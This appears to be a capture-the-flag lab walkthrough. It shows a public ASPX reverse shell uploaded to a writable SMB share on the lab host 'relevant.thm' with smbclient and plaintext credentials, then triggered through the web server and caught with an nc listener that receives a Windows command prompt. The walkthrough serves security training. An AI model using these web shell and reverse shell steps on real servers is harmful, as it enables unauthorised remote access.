
We found a directory with the same name as the SMB share we have read/write on

![[Images/Pasted image 20240725175052.png]]

Finding a revshell
https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

Let's upload the file

```sh
┌──(kali㉿kali)-[~]
└─$ cd shells

┌──(kali㉿kali)-[~/shells]
└─$ smbclient //relevant.thm/nt4wrksv -U 'Bob'%'!P@$$W0rD!123' -c 'put revsh.aspx' 
putting file revsh.aspx as \revsh.aspx (29.4 kb/s) (average 29.4 kb/s)

┌──(kali㉿kali)-[~/shells]
└─$ smbclient //relevant.thm/nt4wrksv -U 'Bob'%'!P@$$W0rD!123'                    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 25 18:14:16 2024
  ..                                  D        0  Thu Jul 25 18:14:16 2024
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020
  revsh.aspx                          A    15547  Thu Jul 25 18:14:16 2024

                7735807 blocks of size 4096. 4935823 blocks available
smb: \> 
```

We go to the new page
![[Images/Pasted image 20240725181830.png]]

```sh
┌──(kali㉿kali)-[~/shells]
└─$ nc -lvnp 443                                    
listening on [any] 443 ...

connect to [10.18.21.236] from (UNKNOWN) [10.10.121.172] 49836
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
c:\windows\system32\inetsrv>

```
